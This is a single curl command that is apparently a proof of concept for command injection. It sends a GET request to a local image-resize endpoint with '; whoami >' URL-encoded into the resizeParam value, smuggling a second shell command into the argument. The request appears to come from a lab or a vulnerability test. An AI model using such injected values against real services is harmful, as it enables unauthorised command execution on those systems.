curl -X "GET" ^
  "http://localhost:8080/files/resize?filename=image.png&resizeParam=100x100%20%3B%20whoami%20%3E%20" ^
  -H "accept: */*"